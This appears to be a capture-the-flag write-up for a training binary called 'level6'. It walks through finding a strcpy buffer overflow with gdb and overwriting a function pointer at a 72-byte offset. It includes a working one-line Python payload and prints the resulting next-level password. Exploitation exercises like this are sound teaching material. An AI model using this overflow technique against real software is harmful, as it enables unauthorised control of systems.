# Level6

> For introductory information on this operating system and binary securities, check [here](./Ressources/README.md).

Let's see what does the binary do.

```shell
  $> ./level6
  Segmentation fault (core dumped)
  $> ./level6 "teststring"
  Nope
```

> It seems we need to input something as argument.

Using [`gdb`](https://linux.die.net/man/1/gdb), we can dig through the binary to understand what's going on (full analysis [here](./Ressources/gdb.md)). This time a **buffer overflow** is possible due to [`strcpy()`](https://linux.die.net/man/3/fgets) being used. According to the documentation...

> If the destination string of a `strcpy()` is not large enough, then anything might happen.  Overflowing fixed-length string buffers is a favorite cracker technique for taking complete control of the machine.

Since our input can be arbitrary long, we can exploit this vulnerability to modify memory. Thanks to `gdb` we found that the `Nope` message is output by a function that is assigned to a pointer and there is another function that makes a `system()` call giving us the password for next level. All we have to do is:

- Find the address of the other function (`0x08048454`).
- Get the buffer offset (**72**).

Like this, we can tinker an input that overwrite what's stored inside the function pointer address.

```shell
  $> ./level6 `python -c 'print "0" * 72 + "\x08\x04\x84\x54"[::-1]'`
  f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

> This simply shifts the value `0x08048454` **72** bytes further into the memory where the function pointer is located.

So next user credentials pair is `level7:f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d`.

Check [here](./source.c) for reproduction source-code of this binary.